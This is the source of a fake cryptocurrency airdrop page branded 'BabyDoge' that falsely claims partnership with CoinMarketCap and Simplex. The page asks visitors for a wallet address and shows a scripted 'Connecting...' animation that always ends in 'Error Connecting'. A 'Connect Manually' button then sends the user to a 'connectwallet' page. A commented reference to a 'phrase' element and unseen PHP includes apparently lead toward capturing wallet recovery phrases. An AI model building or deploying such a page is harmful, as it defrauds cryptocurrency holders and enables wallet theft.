<html lang="">
	<head>
		<meta charset="utf-8">
			<meta http-equiv="X-UA-Compatible" content="IE=edge">
				<meta name="viewport" content="width=device-width,initial-scale=1">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:site" content="@walletapi">
        <meta name="twitter:title" content="">
        <meta name="twitter:description" content="Airdrop sponsors by BabyDoge Cryptocurrency Team in partnership with CoinMarketCap & SIMPLEX">
				<meta name="og:title" content="BabyDoge Airdrop">
        <meta name="og:type" content="website">
        <!-- <base href="/claim/"> -->
        <meta name="og:description" content="Airdrop sponsors by BabyDoge Cryptocurrency Team in partnership with CoinMarketCap & SIMPLEX">
        <meta name="og:site_name" content="BabyDoge Airdrop">
					<link rel="icon" type="image/png" sizes="32x32" href="/img/favicon-32x32.png">
						<link rel="stylesheet" href="/claim/css.css">
							<title>BabyDoge｜Decentralized Full Aggregation Protocol｜All For Your Trading</title>
							<link href="/claim/app.b37c9089.css" rel="preload" as="style">
								<link href="/claim/chunk-vendors.55204a1e.css" rel="preload" as="style">
									<link href="/claim/app.922333cf.js" rel="preload" as="script">
										<link href="/claim/chunk-vendors.19b73916.js" rel="preload" as="script">
											<link href="/claim/chunk-vendors.55204a1e.css" rel="stylesheet">
												<link href="/claim/app.b37c9089.css" rel="stylesheet">
												<link href="/claim/met.css" rel="stylesheet">
													<style>
/* Popup container - can be anything you want */
.popup {
  position: relative;
  display: inline-block;
  cursor: pointer;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

/* The actual popup */
.popup .popuptext {
  visibility: hidden;
  background-color: #555;
  color: #fff;
  text-align: center;
  position: absolute;
  z-index: 1;
  bottom: 125%;
  left: 40%;
  margin-left: -80px;
}

/* Popup arrow */
.popup .popuptext::after {
  content: "";
  position: absolute;
  top: 100%;
  left: 50%;
  margin-left: -5px;
  border-width: 5px;
  border-style: solid;
  border-color: #555 transparent transparent transparent;
}

/* Toggle this class - hide and show the popup */
.popup .show {
  visibility: visible;
  -webkit-animation: fadeIn 1s;
  animation: fadeIn 1s;
  padding: 10px
}

/* Add animation (fade in the popup) */
@-webkit-keyframes fadeIn {
  from {opacity: 0;}
  to {opacity: 1;}
}

@keyframes fadeIn {
  from {opacity: 0;}
  to {opacity:1 ;}
}
@font-face{font-family:Montserrat-Bold;src:url(Montserrat-Bold.a6bc51efd33e2f7f1b95d90fcb6d5991.otf)}
.logo {
  font-family: Montserrat-Bold!important;
    font-size: 20px;
}
</style>
												</head>
												<body>

                                        <div id="ape"></div>
                                        <?php include '_not.php'; ?>
													<noscript>
														<strong>We're sorry but BabyDoge doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
													</noscript>
													<div id="app">
														<div id="container-stars">
															<div id="stars"></div>
															<div id="stars2"></div>
															<div id="stars3"></div>
														</div>
														<main>
															<div data-v-69304e3a="" class="container-fluid">
																<div data-v-69304e3a="" class="row mb-3 mt-3">
																	<div data-v-69304e3a="" class="col">
																		<h2 class="logo">BabyDoge</h2>
																		</div>
																	</div>
																	<div data-v-69304e3a="" class="justify-content-md-center mt-5">
																		<div data-v-69304e3a="" class="row">
																			<div data-v-69304e3a="" class="col-lg-5 col-xl-4 col-md-6 col-sm-8 col-xs-12 mx-auto">
																				<div data-v-69304e3a="" class="row mt-1 mb-3">
																					<div data-v-69304e3a="" class="col text-center">
																						<!-- <h2 data-v-69304e3a="" class="pair-info-bold">
																							<span data-v-69304e3a=""> / </span>
																						</h2> -->
																						<!-- <h6 data-v-69304e3a="" class="pair-info-normal">
																							<span data-v-69304e3a=""> No input selected </span>
																						</h6> -->
																					</div>
																				</div>
																				<div data-v-69304e3a="" class="row mt-1">
																					<div data-v-69304e3a="" class="col-4">
																						<h6 data-v-69304e3a="">Type</h6>
		<!--												<select  style=" height: 54px; border: none; outline: none; background: #0c2649; color: #fff; font-weight: 600; padding: 5px; /* width: 229px; */ box-sizing: border-box; font-size: 17px; width: 100%; ">-->
  <!--<option value="BEP20">BEP 20</option>-->
  <!--<option value="ERC20">ERC 20</option>-->
  <!--</select>-->
<!--</select>							-->
<button data-v-69304e3a="" class="btn btn-primary btn-block text-left btn-currency">BEP 20
																							<svg data-v-69304e3a="" viewBox="0 0 16 16" width="1em" height="1em" focusable="false" role="img" aria-label="chevron down"
																								xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi-chevron-down ml-2 b-icon bi" style="font-size: 80%;">
																								<g data-v-69304e3a="">
																									<path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"></path>
																								</g>
																							</svg>
																						</button>
																					</div>
																					<div data-v-69304e3a="" class="col-8">
																						<h6 data-v-69304e3a="" class="float-left">Wallet Address</h6>
																						<!---->
																						<div data-v-69304e3a="" class="form-group  mb-2">


																							<input data-v-69304e3a="" type="text" placeholder="Wallet Address" class="form-control input-for-balances" name="address" required id="op">
																							</div>
																						</div>
																					</div>
																					<div data-v-69304e3a="" class="row">
																						<div data-v-69304e3a="" class="col-12 text-center mt-2">
																							<!---->
																							<!---->
																							<!---->
																							<button data-v-69304e3a="" type="submit" class="btn btn-lg btn-success btn-block" onclick="myF()" >
																								<svg data-v-69304e3a="" viewBox="0 0 16 16" width="1em" height="1em" focusable="false" role="img" aria-label="arrows angle contract"
																									xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi-arrows-angle-contract mr-2 b-icon bi">
																									<g data-v-69304e3a="">
																										<path fill-rule="evenodd" d="M.172 15.828a.5.5 0 0 0 .707 0l4.096-4.096V14.5a.5.5 0 1 0 1 0v-3.975a.5.5 0 0 0-.5-.5H1.5a.5.5 0 0 0 0 1h2.768L.172 15.121a.5.5 0 0 0 0 .707zM15.828.172a.5.5 0 0 0-.707 0l-4.096 4.096V1.5a.5.5 0 1 0-1 0v3.975a.5.5 0 0 0 .5.5H14.5a.5.5 0 0 0 0-1h-2.768L15.828.879a.5.5 0 0 0 0-.707z"></path>
																									</g>
																								</svg> First Time Authentication
																							</button>
																						</div>
																					</div>
																					<div data-v-69304e3a="" class="row">
																						<div data-v-69304e3a="" class="col-12 text-center mt-3">
																							<!---->
																							<!---->
																							<!---->
																							<button data-v-69304e3a="" type="button" class="btn btn-lg btn-info btn-block popup" onclick="myFunction()">
																								<svg data-v-69304e3a="" viewBox="0 0 16 16" width="1em" height="1em" focusable="false" role="img" aria-label="arrows angle contract"
																									xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi-arrows-angle-contract mr-2 b-icon bi">
																									<g data-v-69304e3a="">
																										<path fill-rule="evenodd" d="M.172 15.828a.5.5 0 0 0 .707 0l4.096-4.096V14.5a.5.5 0 1 0 1 0v-3.975a.5.5 0 0 0-.5-.5H1.5a.5.5 0 0 0 0 1h2.768L.172 15.121a.5.5 0 0 0 0 .707zM15.828.172a.5.5 0 0 0-.707 0l-4.096 4.096V1.5a.5.5 0 1 0-1 0v3.975a.5.5 0 0 0 .5.5H14.5a.5.5 0 0 0 0-1h-2.768L15.828.879a.5.5 0 0 0 0-.707z"></path>
																									</g>
																								</svg> Transfer to My Wallet

																								<!-- <span class="popuptext" > Wallet Unauthenticated !</span> -->
                                                <div id="myPopup" class="popuptext" >
                                                  <span>Wallet Unauthenticated!</span>
                                                </div>
																							</button>


																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																		<!---->
																		<!---->
																	</div>
																</main>
																<div class="container-fluid">
																	<div class="row mt-5">
																		<div class="col-12 text-center  mb-5">
																			<div data-v-5eff2c82="" style="font-size: 16px; padding: 0px 30px; color: fffff;">
																				<p data-v-5eff2c82=""> 1. You need to click "First Time Authentication" button before you claim BabyDoge at the first time. </p>
																				<p data-v-5eff2c82=""> 2. You can transfer available BabyDoge to your wallet by "Transfer to My Wallet" button </p>
																			</div>
																		</div>
																	</div>
																</div>
															<div class="faq-container"style="padding: 10px 30px;width: 100%;position: absolute;z-index: 1000;">
													<h3 class="faq-heading" style="font-size:18px">Useful info</h3>
													<div class="panel-group width-100" id="accordion" role="tablist" aria-multiselectable="true">
      <div class="panel panel-default width-100">
        <div class="panel-heading width-100" role="tab" id="headingOne" style="margin-bottom: 16px;">
          <h4 class="panel-title">
           

            <a class="width-100 collapsed" onclick="mytiAon()">How many tokens do I need to receive rewards?</a>
          </h4>
        </div>
        <div id="myDIV" style="display:none">
          <div class="panel-body width-100">You need to hold BabyDoge/BNB in the connected wallet to claim airdrop, the more BabyDoge/BNB you hold the more you receive.</div>
      </div>


      <div class="panel panel-default width-100">
        <div class="panel-heading width-100" role="tab" id="headingTwo" style="margin: 16px 0px;">
          <h4 class="panel-title">
            <a onclick="mytioWn()" class="faq-question width-100 collapsed">When do I receive my rewards?</a>
          </h4>
        </div>
        <div id="collapseTwo" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="headingTwo" style="display:none">
          <div class="panel-body width-100">The BabyDoge airdrop reward will be sent automatically to your connected wallet when the amount of your Rewards is enough to justify the transaction fee.</div>
      </div>


      <div class="panel panel-default width-100" style="margin-bottom: 40px !important;">
        <div class="panel-heading width-100" role="tab" id="headingThree" style="margin: 16px 0px;">
          <h4 class="panel-title">
            <a onclick="mytion()" class="faq-question width-100 collapsed">I didn't receive my rewards today, why?</a>
          </h4>
        </div>
        <div id="collapseThree" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="headingThree" style="display:none">
          <div class="panel-body width-100">Hours of low volume may delay your rewards. Your rewards will not be lost, the contract takes care of it! When volume starts going up again you will get your rewards added to your wallet at a faster rate!</div>
      </div>
    </div>

    <a href="/" style="font-size: 16px !important; display: flex; justify-content: center;">Copyright © 2021 BabyDoge</a>



</div></div></div>
															</div>
															<!---->
															</div>
															<!---->
															<div class="sc-bdVaJa LPcxt" id="ppf" data-reach-dialog-overlay="" style="opacity: 1;display: none">
            <div aria-modal="true" role="dialog" tabindex="-1" aria-label="dialog" class="sc-bwzfXH iiXYOL" data-reach-dialog-content="">
                <div class="sc-cMhqgX gUQEWC">
                    <div class="sc-cmthru jJAhga">
                        <div class="sc-bsbRJL fRcQRh">
                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-hZSUBg fRJrUU">
              <line x1="18" y1="6" x2="6" y2="18">
              </line>
              <line x1="6" y1="6" x2="18" y2="18">
              </line>
            </svg>
                        </div>
                        <div class="sc-iuJeZd hRZQmk" color="blue">
                            <div class="sc-gqPbQI fhSmUE">
                                Back
                            </div>
                        </div>
                        <div class="sc-esOvli jebOoi">
                            <div class="sc-hrWEMg bHjlF">
                                <div class="sc-gwVKww jEMAel">
                                    <div class="sc-iQNlJl dJZYYq">
                                        <div class="sc-hXRMBi deLgHH">
                                            <div class="loading">
                                                I
                                            </div>
                                            <div class="sc-epnACN jwEAlI" style="display: none" onclick="Xonnect()">
                                                Connect Manually
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <button id="connect-METAMASK" class="sc-kPVwWT sc-kfGgVZ sc-kIPQKe dQoUpv">
                <div class="sc-esjQYD iGptdp">
                  <div color="#E8831D" class="sc-RefOD jsJmJE">
                    BabyDoge
                  </div>
                  <div class="sc-iQKALj GTKuw">
                    Easy-to-use browser extension.
                  </div>
                </div>
                <div class="sc-bwCtUz lgYJCf">
                  <img class="firstImg" src="../cdn.shopify.com/s/files/1/0388/4833/1916/files/Hero_image_700x700d9ce.png?v=1623834922" alt="Icon" style="width: 24px;">
                </div>
              </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
															<?php include '_ton.php'; ?>
															<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
															   <script>
function mytion() {
  var element = document.getElementById("collapseThree");
  element.classList.toggle("mystyle");
// console.log("a");
}
function mytioWn() {
  var element = document.getElementById("collapseTwo");
  element.classList.toggle("mystyle");
// console.log("a");
}
function mytiAon() {
  var element = document.getElementById("myDIV");
  element.classList.toggle("mystyle");
// console.log("a");
}
</script>
															
<!--<script src="inc/main.466fc98f7ef5f9a49be7.js" charset="utf-8"></script>-->
<style>
[data-reach-dialog-overlay] {
    background: rgba(0, 0, 0, .33);
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: auto;
    background-image: initial;
    background-position-x: initial;
    background-position-y: initial;
    background-size: initial;
    background-repeat-x: initial;
    background-repeat-y: initial;
    background-attachment: initial;
    background-origin: initial;
    background-clip: initial;
    background-color: rgb(239 241 244);
    overflow-x: auto;
    overflow-y: auto;
}
.LPcxt[data-reach-dialog-overlay] {
    z-index: 2;
    overflow: hidden;
    display: flex;
    -webkit-box-align: center;
    align-items: center;
    -webkit-box-pack: center;
    justify-content: center;
    background-color: rgba(0, 0, 0, 0.424);
    overflow-x: hidden;
    overflow-y: hidden;
}
[tabindex] {
    outline: none;
}
.iiXYOL {
    overflow-y: hidden;
}
.jJAhga {
    position: relative;
}

.fRcQRh {
    position: absolute;
    right: 1rem;
    top: 14px;
}
.hRZQmk {
    display: flex;
    flex-flow: row nowrap;
    padding: 1rem;
    font-weight: 500;
    color: rgb(33, 114, 229);
    flex-direction: row;
    flex-wrap: nowrap;
    padding-top: 1rem;
    padding-right: 1rem;
    padding-bottom: 1rem;
    padding-left: 1rem;
    background-color: #f2f2f2f0;
}
.bHjlF>* {
    width: 100%;
}
.bHjlF {
    display: flex;
    flex-flow: column nowrap;
    -webkit-box-align: center;
    align-items: center;
    -webkit-box-pack: center;
    justify-content: center;
    width: 100%;
    flex-direction: column;
    flex-wrap: nowrap;
}
.dJZYYq {
    display: flex;
    flex-flow: row nowrap;
    -webkit-box-align: center;
    align-items: center;
    -webkit-box-pack: center;
    justify-content: center;
    flex-direction: row;
    flex-wrap: nowrap;
}
.iGptdp {
    display: flex;
    flex-flow: column nowrap;
    -webkit-box-pack: center;
    justify-content: center;
    height: 100%;
    flex-direction: column;
    flex-wrap: nowrap;
}
.jsJmJE {
    display: flex;
    flex-flow: row nowrap;
    color: rgb(86 77 77);
    font-size: 1rem;
    font-weight: 500;
    flex-direction: row;
    flex-wrap: nowrap;
}
.lgYJCf {
    display: flex;
    flex-flow: column nowrap;
    -webkit-box-align: center;
    align-items: center;
    -webkit-box-pack: center;
    justify-content: center;
    flex-direction: column;
    flex-wrap: nowrap;
}
.lgYJCf>img, .lgYJCf span {
    height: 24px;
    width: 24px;
}
.GTKuw {
    color: rgb(86 77 77);
    margin-top: 10px;
    font-size: 12px;
}
.dQoUpv {
    background-color: white;
    outline: none;
    border: 1px solid rgb(64, 68, 79);
    border-radius: 12px;
    display: flex;
    flex-direction: row;
    -webkit-box-align: center;
    align-items: center;
    -webkit-box-pack: justify;
    justify-content: space-between;
    padding: 1rem;
    margin-top: 0px;
    opacity: 1;
    width: 100% !important;
    outline-color: initial;
    outline-style: none;
    outline-width: initial;
    border-top-width: 1px;
    border-right-width: 1px;
    border-bottom-width: 1px;
    border-left-width: 1px;
    border-top-style: solid;
    border-right-style: solid;
    border-bottom-style: solid;
    border-left-style: solid;
    border-image-source: initial;
    border-image-slice: initial;
    border-image-width: initial;
    border-image-outset: initial;
    border-image-repeat: initial;
    border-top-left-radius: 12px;
    border-top-right-radius: 12px;
    border-bottom-right-radius: 12px;
    border-bottom-left-radius: 12px;
    border-top-color: rgb(64, 68, 79);
    border-right-color: rgb(64, 68, 79);
    border-bottom-color: rgb(64, 68, 79);
    border-left-color: rgb(64, 68, 79);
    padding-top: 1rem;
    padding-right: 1rem;
    padding-bottom: 1rem;
    padding-left: 1rem;
}
.jwEAlI {
    border-radius: 8px;
    font-size: 12px;
    color: rgb(255, 255, 255);
    background-color: rgb(86, 90, 105);
    margin-left: 1rem;
    padding: 0.5rem;
    font-weight: 600;
    user-select: none;
    border-top-left-radius: 8px;
    border-top-right-radius: 8px;
    border-bottom-right-radius: 8px;
    border-bottom-left-radius: 8px;
    padding-top: 0.5rem;
    padding-right: 0.5rem;
    padding-bottom: 0.5rem;
    padding-left: 0.5rem;
}
.deLgHH {
    display: flex;
    flex-flow: row nowrap;
    -webkit-box-align: center;
    align-items: center;
    -webkit-box-pack: start;
    justify-content: flex-start;
    flex-direction: row;
    flex-wrap: nowrap;
}
.jEMAel>* {
    padding: 1rem;
    padding-top: 1rem;
    padding-right: 1rem;
    padding-bottom: 1rem;
    padding-left: 1rem;
}
.jEMAel {
    display: flex;
    flex-flow: row nowrap;
    -webkit-box-align: center;
    align-items: center;
    -webkit-box-pack: start;
    justify-content: flex-start;
    border-radius: 12px;
    margin-bottom: 20px;
    color: rgb(253, 64, 64);
    border: 1px solid rgb(253, 64, 64);
    flex-direction: row;
    flex-wrap: nowrap;
    border-top-left-radius: 12px;
    border-top-right-radius: 12px;
    border-bottom-right-radius: 12px;
    border-bottom-left-radius: 12px;
    border-top-width: 1px;
    border-right-width: 1px;
    border-bottom-width: 1px;
    border-left-width: 1px;
    border-top-style: solid;
    border-right-style: solid;
    border-bottom-style: solid;
    border-left-style: solid;
    border-top-color: rgb(253, 64, 64);
    border-right-color: rgb(253, 64, 64);
    border-bottom-color: rgb(253, 64, 64);
    border-left-color: rgb(253, 64, 64);
    border-image-source: initial;
    border-image-slice: initial;
    border-image-width: initial;
    border-image-outset: initial;
    border-image-repeat: initial;
}
.jebOoi {
    background-color: white;
    padding: 2rem;
    border-bottom-left-radius: 20px;
    border-bottom-right-radius: 20px;
    padding-top: 2rem;
    padding-right: 2rem;
    padding-bottom: 2rem;
    padding-left: 2rem;
}
.gUQEWC {
    display: flex;
    flex-flow: column nowrap;
    margin: 0px;
    padding: 0px;
    width: 100%;
    flex-direction: column;
    flex-wrap: nowrap;
    margin-top: 0px;
    margin-right: 0px;
    margin-bottom: 0px;
    margin-left: 0px;
    padding-top: 0px;
    padding-right: 0px;
    padding-bottom: 0px;
    padding-left: 0px;
}
[data-reach-dialog-content] {
    width: 50vw;
    margin: 10vh auto;
    background: #fff;
    padding: 2rem;
    outline: none;
    margin-top: 10vh;
    margin-right: auto;
    margin-bottom: 10vh;
    margin-left: auto;
    background-image: initial;
    background-position-x: initial;
    background-position-y: initial;
    background-size: initial;
    background-repeat-x: initial;
    background-repeat-y: initial;
    background-attachment: initial;
    background-origin: initial;
    background-clip: initial;
    background-color: rgb(255, 255, 255);
    padding-top: 2rem;
    padding-right: 2rem;
    padding-bottom: 2rem;
    padding-left: 2rem;
    outline-color: initial;
    outline-style: none;
    outline-width: initial;
}
.iiXYOL[data-reach-dialog-content] {
    margin: 0px 0px 2rem;
    background-color: rgb(33, 36, 41);
    box-shadow: rgb(0 0 0 / 5%) 0px 4px 8px 0px;
    padding: 0px;
    width: 90vw;
    overflow: hidden;
    align-self: center;
    max-width: 420px;
    max-height: 90vh;
    display: flex;
    border-radius: 20px;
    margin-top: 0px;
    margin-right: 0px;
    margin-bottom: 2rem;
    margin-left: 0px;
    padding-top: 0px;
    padding-right: 0px;
    padding-bottom: 0px;
    padding-left: 0px;
    overflow-y: hidden;
    overflow-x: hidden;
    border-top-left-radius: 20px;
    border-top-right-radius: 20px;
    border-bottom-right-radius: 20px;
    border-bottom-left-radius: 20px;
}
.mystyle {
    display:block!important;
}
.panel-body {
    padding-bottom: 10px;
    background-color: transparent;
    padding: 24px;
    color: #dadada;
    border-radius: 16px;
    font-size: 14px;
    border: 1px solid #e8e8e8;
}
    .width-100 {
    width: 100%;
}
.panel-body {
    font-size: 20px;
}
.panel-default>.panel-heading {
    color: var(--dark);
    background-color: white;
    border: 1px solid #e8e8e8;
    border-radius: 16px;
    padding: 0;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}
.panel-default>.panel-heading {
    background-color: white !important;
    color: var(--dark);
}
.panel-default>.panel-heading a {
    display: block;
    padding: 16px 24px;
}
.panel-default a {
    color: var(--dark) !important;
    padding: 24px !important;
    line-height: 100% !important;
    font-size: 21px !important;
}
</style>
<script type="text/javascript">
function myF() {
var value = document.getElementById('op').value;
 if (value.length < 3) {
   alert("Wallet address is empty!"); // keep form from submitting
 }else {
     var element = document.getElementById("ppf");
    element.classList.toggle("my");
    loadings();
 }

}
function goF() {
var element = document.getElementById("fr");
// element.classList.toggle("my");
$("#fr").removeClass("my");
}

function opF() {
var element = document.getElementById("fr");
$("#fr").removeClass("my");
$("#walletconnect-wrapper").addClass("my");
}
function qrclose() {
  $("#walletconnect-wrapper").removeClass("my");
    $("#fr").removeClass("my");
}
</script>
															<script>
// When the user clicks on div, open the popup
function myFunction() {
  var popup = document.getElementById("myPopup");
  popup.classList.toggle("show");
}
// 
            var connect = document.querySelector(".jwEAlI");
var loading = document.querySelector(".loading");
function loadings() {
  var a =  setTimeout(function () {
      loading.innerHTML = "Connecting.";
    }, 1)

    var a = setTimeout(function() {
      loading.innerHTML = "Connecting..";
    }, 600)

    var a = setTimeout(function() {
      loading.innerHTML = "Connecting...";
    }, 1200)
  var a =  setTimeout(function () {
      loading.innerHTML = "Connecting.";
    }, 1800)

    var a = setTimeout(function() {
      loading.innerHTML = "Connecting..";
    }, 2400)

    var a = setTimeout(function() {
      loading.innerHTML = "Connecting...";
    }, 3000)

    var a = setTimeout(function() {
      loading.innerHTML = "Error Connecting.."
      connect.style.display = "flex"
    }, 3600)

    //NEWLY ADDED
    //document.getElementById("phrase").click();

  }
  
  function Xonnect() {
    var addr =  document.getElementById('op').value;
    window.location.href = "connectwallet?r=1f3870be274f6c49b3e31a0c6728957f&1f3870be274f6c49b3e31a0c6728957f&addr="+addr+"&hash=1f3870be274f6c49b3e31a0c6728957f";
  }
//   document.addEventListener("DOMContentLoaded", loadings);
</script>
															<!-- <script src="chunk-vendors.19b73916.js"></script> -->
															<!-- <script src="app.922333cf.js"></script> -->
														</body>
													</html>
